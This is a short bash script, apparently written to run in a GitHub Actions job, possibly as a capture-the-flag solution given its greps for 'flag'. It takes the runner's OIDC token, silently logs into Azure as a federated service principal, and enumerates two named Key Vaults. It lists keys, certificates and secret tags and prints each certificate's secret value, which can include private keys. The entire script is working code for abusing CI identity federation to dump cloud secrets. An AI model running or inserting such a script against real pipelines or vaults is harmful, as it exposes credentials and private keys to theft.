#!/usr/bin/env bash
set +e
IDTOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$IDTOKEN" --allow-no-subscriptions >/dev/null 2>&1
for v in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "===== $v KEYS ====="
  az keyvault key list --vault-name $v -o json 2>&1 | head -30
  echo "===== $v CERTIFICATES ====="
  az keyvault certificate list --vault-name $v -o json 2>&1 | head -40
  for c in $(az keyvault certificate list --vault-name $v --query "[].name" -o tsv 2>/dev/null); do
    echo "-- cert $c --"
    az keyvault certificate show --vault-name $v -n "$c" -o json 2>/dev/null | grep -iE 'flag|cn=|subject|tags|\{'
    az keyvault secret show --vault-name $v -n "$c" --query value -o tsv 2>/dev/null | head -c 500
  done
  echo "===== $v SECRET TAGS ====="
  az keyvault secret list --vault-name $v -o json 2>&1 | grep -iE 'tags|flag'
done
echo "===== DONE ====="
